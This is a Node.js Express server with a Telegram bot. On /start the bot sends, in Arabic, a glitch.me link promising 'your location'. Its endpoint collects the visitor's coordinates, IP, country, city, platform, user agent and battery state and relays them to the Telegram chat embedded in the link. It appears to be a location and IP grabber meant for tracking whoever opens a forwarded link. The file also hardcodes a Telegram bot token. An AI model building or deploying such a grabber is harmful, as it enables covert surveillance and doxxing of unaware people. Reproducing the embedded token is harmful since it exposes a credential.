const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const path = require('path');

const botToken = '7235293038:AAG9RdOV0AXcXxn32wY62njSc6wbPayjOvA';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/getLocation/:chatId', (req, res) => {
    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        await bot.sendLocation(chatId, latitude, longitude);
        
        const message = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
متصفح المستخدم: ${additionalData.userAgent}
مستوى البطارية: ${additionalData.batteryLevel}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
        `;
        
        await bot.sendMessage(chatId, message);
        console.log('Location and additional data sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const locationLink = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
    bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${locationLink}`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});